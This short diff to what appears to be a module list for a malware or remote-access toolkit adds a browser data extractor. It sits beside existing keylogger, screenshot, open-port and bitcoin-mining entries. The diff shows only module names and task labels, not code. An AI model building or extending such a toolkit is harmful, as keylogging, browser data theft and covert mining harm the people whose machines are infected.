@@ -6,5 +6,6 @@
     {"module": "openportslister.py", "task": "shows_open_ports"},
     {"module": "screenshot.py", "task": "takes_screenshots"},
     {"module": "keylogger.py", "task": "just_keylogger"},
+    {"module": "browser_data_extractor.py", "task": "extracts_data_from_browser"},
     {"module": "btcminer.py", "task": "starts_cpu_mining_btc"}
 ]
